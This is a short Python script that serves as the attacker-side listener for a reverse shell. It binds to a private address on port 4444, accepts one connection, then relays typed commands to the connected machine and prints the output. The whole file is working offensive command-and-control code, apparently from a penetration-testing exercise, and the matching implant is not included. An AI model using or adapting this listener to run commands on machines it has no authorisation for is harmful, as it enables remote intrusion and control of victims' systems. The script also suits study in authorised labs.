#!/usr/bin/env python
import socket
listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("192.168.173.35",4444))
listener.listen(0)
print("[+] Waiting for incoming connections")
connection,address = listener.accept()
print("[+] Got a connetion" + str(address))

while True:
	command = raw_input(">> ")
	connection.send(command.encode())
	result = connection.recv(1024)
	print(result.decode())